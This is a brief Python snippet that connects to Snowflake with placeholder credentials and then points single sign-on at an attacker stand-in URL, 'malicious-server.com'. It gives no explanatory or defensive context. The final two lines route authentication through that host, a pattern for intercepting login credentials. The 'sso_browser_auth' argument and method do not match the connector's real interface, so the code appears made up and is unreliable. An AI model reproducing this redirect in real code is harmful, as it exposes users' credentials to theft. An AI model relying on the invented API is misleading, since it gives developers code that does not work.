import snowflake.connector

conn = snowflake.connector.connect(
    user='username',
    password='password',
    account='account_name',
    warehouse='warehouse_name',
    database='database_name',
    schema='schema_name',
    sso_browser_auth=True
)

sso_url = 'https://malicious-server.com/snowflake_sso'


conn.sso_browser_auth(sso_url)